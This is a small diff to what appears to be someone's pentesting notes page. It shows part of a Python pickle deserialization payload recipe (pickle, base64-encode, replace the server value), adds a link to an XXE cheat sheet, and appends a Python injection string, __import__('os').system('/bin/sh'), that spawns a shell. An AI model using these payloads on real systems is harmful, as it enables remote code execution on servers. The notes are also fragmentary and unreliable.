@@ -117,13 +117,16 @@ toc_sticky: true
     b = Blah()
     print cPickle.dumps(b)
     
-
+  </code></pre>
 </fieldset>
 
 <li>run script</li>
 <li>base64 encode result</li>
 <li>replace server thingy</li>
 
+
+<h2>xml</h2>
+<p>https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md</p>
 
 
 
@@ -144,3 +147,4 @@ toc_sticky: true
 
 
 g0tmilk
+asd__import__('os').system('/bin/sh')asd  
